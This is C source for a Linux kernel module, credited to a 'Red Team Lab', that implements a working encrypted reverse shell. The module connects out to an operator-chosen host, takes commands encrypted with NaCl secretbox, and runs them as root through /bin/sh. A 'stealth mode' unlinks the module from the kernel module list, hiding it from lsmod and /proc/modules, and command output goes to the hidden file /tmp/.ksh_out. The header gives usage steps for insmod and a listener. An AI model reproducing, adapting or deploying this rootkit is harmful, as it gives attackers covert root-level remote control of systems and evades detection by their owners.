/*
 * kshell_nacl.c — NaCl-encrypted kernel reverse shell
 *
 * Uses embedded TweetNaCl (crypto_secretbox = XSalsa20 + Poly1305) for
 * authenticated encryption. No dependency on the kernel crypto API — the
 * entire NaCl implementation is in tweetnacl_kernel.h (~300 lines of C).
 *
 * This works on ALL Linux kernels from 2.6 to latest because:
 *   - TweetNaCl is pure C with no kernel API dependencies
 *   - Only needs linux/types.h and linux/string.h (available since 2.6)
 *   - The kernel socket API (sock_create, kernel_connect) is stable since 2.6
 *
 * Wire protocol:
 *   Each message is framed as:
 *     [4-byte LE total_len][24-byte nonce][ciphertext (padded secretbox)]
 *
 *   crypto_secretbox expects:
 *     plaintext:  [32 zero bytes][actual message]
 *     ciphertext: [16 zero bytes][16-byte authenticator][encrypted message]
 *
 *   We strip the 16-byte zero prefix from ciphertext before sending,
 *   and strip the 32-byte zero prefix from plaintext after decrypting.
 *
 * Usage:
 *   KEY=$(python3 -c "import os; print(os.urandom(32).hex())")
 *   python3 kernel/lp/listener.py --port 4444 --key $KEY --nacl
 *   insmod kshell_nacl.ko host=127.0.0.1 port=4444 key=$KEY
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kthread.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/socket.h>
#include <linux/slab.h>
#include <linux/delay.h>
#include <linux/random.h>
#include <net/sock.h>

/* Embedded TweetNaCl — pure C, no kernel crypto API needed */
#include "tweetnacl_kernel.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Red Team Lab");
MODULE_DESCRIPTION("NaCl-encrypted kernel reverse shell (embedded TweetNaCl, 2.6+)");

static char *host = "127.0.0.1";
module_param(host, charp, 0444);

static int port = 4444;
module_param(port, int, 0444);

static char *key = "";
module_param(key, charp, 0444);
MODULE_PARM_DESC(key, "256-bit PSK as hex (64 chars)");

static int persist = 0;
module_param(persist, int, 0444);
MODULE_PARM_DESC(persist, "1=stay loaded, 0=fire-and-forget (default)");

static struct task_struct *shell_thread;

/*
 * All runtime state lives in this heap-allocated struct.
 * In fire-and-forget mode, the module's .bss/.data are freed after init,
 * so the kthread MUST NOT reference any module statics.
 * Everything goes through kctx which is kmalloc'd and survives.
 */
struct kshell_ctx {
    char host[64];
    int port;
    u8 key[32];
    int ff;
    u64 nonce_ctr;
    struct socket *sock;
};
static struct kshell_ctx *kctx;

/* --- Hex decode --- */
static int hex_to_bytes(const char *hex, u8 *out, int len)
{
    int i;
    for (i = 0; i < len; i++) {
        int hi, lo;
        char c = hex[i * 2];
        if      (c >= '0' && c <= '9') hi = c - '0';
        else if (c >= 'a' && c <= 'f') hi = c - 'a' + 10;
        else if (c >= 'A' && c <= 'F') hi = c - 'A' + 10;
        else return -1;
        c = hex[i * 2 + 1];
        if      (c >= '0' && c <= '9') lo = c - '0';
        else if (c >= 'a' && c <= 'f') lo = c - 'a' + 10;
        else if (c >= 'A' && c <= 'F') lo = c - 'A' + 10;
        else return -1;
        out[i] = (hi << 4) | lo;
    }
    return 0;
}

/* --- Socket helpers --- */
static __be32 parse_ip(const char *s)
{
    unsigned a, b, c, d;
    if (sscanf(s, "%u.%u.%u.%u", &a, &b, &c, &d) != 4)
        return htonl(INADDR_LOOPBACK);
    return htonl((a << 24) | (b << 16) | (c << 8) | d);
}

static int ksend_raw(struct socket *sock, const void *buf, int len)
{
    struct msghdr msg = {};
    struct kvec iov = { .iov_base = (void *)buf, .iov_len = len };
    return kernel_sendmsg(sock, &msg, &iov, 1, len);
}

static int krecv_raw(struct socket *sock, void *buf, int len)
{
    struct msghdr msg = {};
    struct kvec iov = { .iov_base = buf, .iov_len = len };
    return kernel_recvmsg(sock, &msg, &iov, 1, len, 0);
}

/*
 * ksend_encrypted — Encrypt and send a message using NaCl secretbox.
 *
 * Wire format: [4-byte LE total_len][24-byte nonce][authenticator + ciphertext]
 *
 * crypto_secretbox requires 32 zero-byte prefix on plaintext.
 * It produces 16 zero-byte prefix on ciphertext (which we skip).
 */
static int ksend_encrypted(struct kshell_ctx *ctx, const u8 *data, int len)
{
    u8 nonce[crypto_secretbox_NONCEBYTES];
    u8 *padded_pt;
    u8 *padded_ct;
    int padded_len;
    int wire_len;
    u32 frame_len;
    int ret;

    padded_len = crypto_secretbox_ZEROBYTES + len;
    padded_pt = kmalloc(padded_len, GFP_KERNEL);
    padded_ct = kmalloc(padded_len, GFP_KERNEL);
    if (!padded_pt || !padded_ct) {
        kfree(padded_pt);
        kfree(padded_ct);
        return -ENOMEM;
    }

    memset(padded_pt, 0, crypto_secretbox_ZEROBYTES);
    memcpy(padded_pt + crypto_secretbox_ZEROBYTES, data, len);

    memset(nonce, 0, 16);
    *(u64 *)(nonce + 16) = cpu_to_le64(ctx->nonce_ctr++);

    ret = crypto_secretbox(padded_ct, padded_pt, padded_len, nonce, ctx->key);
    if (ret) {
        kfree(padded_pt);
        kfree(padded_ct);
        return ret;
    }

    wire_len = crypto_secretbox_NONCEBYTES +
               (padded_len - crypto_secretbox_BOXZEROBYTES);

    frame_len = cpu_to_le32(wire_len);
    ret = ksend_raw(ctx->sock, &frame_len, 4);
    if (ret > 0)
        ret = ksend_raw(ctx->sock, nonce, crypto_secretbox_NONCEBYTES);
    if (ret > 0)
        ret = ksend_raw(ctx->sock, padded_ct + crypto_secretbox_BOXZEROBYTES,
                        padded_len - crypto_secretbox_BOXZEROBYTES);

    kfree(padded_pt);
    kfree(padded_ct);
    return ret;
}

/*
 * krecv_encrypted — Receive and decrypt a NaCl secretbox message.
 */
static int krecv_encrypted(struct kshell_ctx *ctx, u8 *out, int max_len)
{
    u32 frame_len;
    u8 nonce[crypto_secretbox_NONCEBYTES];
    u8 *wire_ct;    /* authenticator + ciphertext from wire */
    u8 *padded_ct;  /* 16 zero bytes + wire_ct */
    u8 *padded_pt;  /* 32 zero bytes + plaintext (after decrypt) */
    int wire_ct_len;
    int padded_len;
    int pt_len;
    int ret;

    /* Read frame length */
    ret = krecv_raw(ctx->sock, &frame_len, 4);
    if (ret <= 0) return ret;
    frame_len = le32_to_cpu(frame_len);
    if (frame_len > 65536 || frame_len < crypto_secretbox_NONCEBYTES + 16)
        return -EINVAL;

    /* Read nonce */
    ret = krecv_raw(ctx->sock, nonce, crypto_secretbox_NONCEBYTES);
    if (ret <= 0) return ret;

    /* Read authenticator + ciphertext */
    wire_ct_len = frame_len - crypto_secretbox_NONCEBYTES;
    wire_ct = kmalloc(wire_ct_len, GFP_KERNEL);
    if (!wire_ct) return -ENOMEM;

    ret = krecv_raw(ctx->sock, wire_ct, wire_ct_len);
    if (ret <= 0) { kfree(wire_ct); return ret; }

    /* Rebuild padded ciphertext: [16 zero bytes][wire_ct] */
    padded_len = crypto_secretbox_BOXZEROBYTES + wire_ct_len;
    padded_ct = kmalloc(padded_len, GFP_KERNEL);
    padded_pt = kmalloc(padded_len, GFP_KERNEL);
    if (!padded_ct || !padded_pt) {
        kfree(wire_ct);
        kfree(padded_ct);
        kfree(padded_pt);
        return -ENOMEM;
    }

    memset(padded_ct, 0, crypto_secretbox_BOXZEROBYTES);
    memcpy(padded_ct + crypto_secretbox_BOXZEROBYTES, wire_ct, wire_ct_len);
    kfree(wire_ct);

    /* Decrypt + verify */
    ret = crypto_secretbox_open(padded_pt, padded_ct, padded_len, nonce, ctx->key);
    kfree(padded_ct);

    if (ret) {
        pr_debug("kshell_nacl: decrypt failed (bad key or tampered)\n");
        kfree(padded_pt);
        return -EBADMSG;
    }

    /* Extract plaintext (skip 32 zero-byte prefix) */
    pt_len = padded_len - crypto_secretbox_ZEROBYTES;
    if (pt_len > max_len) pt_len = max_len;
    memcpy(out, padded_pt + crypto_secretbox_ZEROBYTES, pt_len);
    kfree(padded_pt);

    return pt_len;
}

/* --- Command execution (same as kshell.c) --- */
static int run_cmd(const char *cmd, char *output, int output_len)
{
    char *full_cmd;
    char *argv[] = { "/bin/sh", "-c", NULL, NULL };
    char *envp[] = { "HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
    struct file *f;
    loff_t pos = 0;
    int ret;

    full_cmd = kmalloc(strlen(cmd) + 64, GFP_KERNEL);
    if (!full_cmd) return -ENOMEM;
    snprintf(full_cmd, strlen(cmd) + 64, "%s > /tmp/.ksh_out 2>&1", cmd);
    argv[2] = full_cmd;

    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    kfree(full_cmd);

    if (ret < 0) {
        snprintf(output, output_len, "exec failed: %d\n", ret);
        return ret;
    }

    f = filp_open("/tmp/.ksh_out", O_RDONLY, 0);
    if (IS_ERR(f)) {
        snprintf(output, output_len, "(no output)\n");
        return 0;
    }

    memset(output, 0, output_len);
    ret = kernel_read(f, output, output_len - 1, &pos);
    filp_close(f, NULL);
    if (ret >= 0 && ret < output_len) output[ret] = '\0';
    return ret;
}

/* --- Shell loop --- */
static int shell_loop(void *data)
{
    struct kshell_ctx *ctx = (struct kshell_ctx *)data;
    struct sockaddr_in addr;
    char *recv_buf = NULL;
    char *output_buf = NULL;
    int ret, len;
    const char *banner =
        "\n[kshell_nacl] encrypted kernel shell (NaCl secretbox)\n"
        "[kshell_nacl] XSalsa20 + Poly1305 (embedded TweetNaCl)\n"
        "[kshell_nacl] works on kernels 2.6 through latest\n"
        "[kshell_nacl] type 'exit' to disconnect\n\n# ";

    recv_buf = kmalloc(4096, GFP_KERNEL);
    output_buf = kmalloc(65536, GFP_KERNEL);
    if (!recv_buf || !output_buf) goto out;

    ret = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &ctx->sock);
    if (ret < 0) goto out;

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(ctx->port);
    addr.sin_addr.s_addr = parse_ip(ctx->host);

    pr_debug("kshell_nacl: connecting to %s:%d (NaCl encrypted)\n",
            ctx->host, ctx->port);

    while (1) {
        if (!ctx->ff && kthread_should_stop()) goto out_sock;
        ret = kernel_connect(ctx->sock, (struct sockaddr *)&addr,
                            sizeof(addr), 0);
        if (ret == 0) break;
        ssleep(3);
    }

    pr_debug("kshell_nacl: connected, sending encrypted banner\n");
    ksend_encrypted(ctx, (const u8 *)banner, strlen(banner));

    while (1) {
        if (!ctx->ff && kthread_should_stop()) break;
        memset(recv_buf, 0, 4096);
        len = krecv_encrypted(ctx, (u8 *)recv_buf, 4095);
        if (len <= 0) break;

        while (len > 0 && (recv_buf[len-1] == '\n' || recv_buf[len-1] == '\r'))
            recv_buf[--len] = '\0';

        if (len == 0) {
            ksend_encrypted(ctx, (const u8 *)"# ", 2);
            continue;
        }

        if (strcmp(recv_buf, "exit") == 0) {
            ksend_encrypted(ctx,
                (const u8 *)"[kshell_nacl] disconnecting\n", 28);
            break;
        }

        pr_debug("kshell_nacl: exec: %s\n", recv_buf);
        memset(output_buf, 0, 65536);
        run_cmd(recv_buf, output_buf, 65536);

        len = strlen(output_buf);
        if (len > 0)
            ksend_encrypted(ctx, (const u8 *)output_buf, len);
        ksend_encrypted(ctx, (const u8 *)"# ", 2);
    }

out_sock:
    if (ctx->sock) { sock_release(ctx->sock); ctx->sock = NULL; }
out:
    kfree(recv_buf);
    kfree(output_buf);
    /* Don't free ctx — it may be needed if we reconnect or for cleanup */
    return 0;
}

static int __init kshell_nacl_init(void)
{
    pr_debug("kshell_nacl: loading (target %s:%d, NaCl encrypted)\n",
            host, port);

    if (!key || strlen(key) != 64) {
        pr_debug("kshell_nacl: key must be 64 hex chars\n");
        return -EINVAL;
    }
    /* Allocate context — this kmalloc'd struct survives module unload
     * in fire-and-forget mode because the kernel doesn't track it */
    kctx = kmalloc(sizeof(*kctx), GFP_KERNEL);
    if (!kctx) return -ENOMEM;
    memset(kctx, 0, sizeof(*kctx));
    strncpy(kctx->host, host, sizeof(kctx->host) - 1);
    kctx->port = port;
    kctx->ff = !persist;
    kctx->nonce_ctr = 0;
    kctx->sock = NULL;

    if (hex_to_bytes(key, kctx->key, 32)) {
        pr_debug("kshell_nacl: invalid hex in key\n");
        kfree(kctx);
        return -EINVAL;
    }

    shell_thread = kthread_run(shell_loop, kctx, "kshell_nacl");
    if (IS_ERR(shell_thread))
        return PTR_ERR(shell_thread);

    pr_debug("kshell_nacl: thread started (pid %d)\n", shell_thread->pid);

    if (!persist) {
        /*
         * Stealth mode: return 0 (module loads) but remove ourselves
         * from the module list so we don't appear in lsmod or
         * /proc/modules. The module's .text stays mapped (kthread needs
         * it) but we're invisible to userspace enumeration.
         *
         * insmod succeeds silently — no error, no trace in lsmod.
         */
        list_del_init(&THIS_MODULE->list);
        pr_debug("kshell_nacl: hidden from /proc/modules\n");
    }

    return 0;
}

static void __exit kshell_nacl_exit(void)
{
    if (shell_thread) { kthread_stop(shell_thread); shell_thread = NULL; }
    if (kctx && kctx->sock) { sock_release(kctx->sock); kctx->sock = NULL; }
    kfree(kctx); kctx = NULL;

    {
        char *argv[] = { "/bin/rm", "-f", "/tmp/.ksh_out", NULL };
        char *envp[] = { "HOME=/", NULL };
        call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    }
}

module_init(kshell_nacl_init);
module_exit(kshell_nacl_exit);
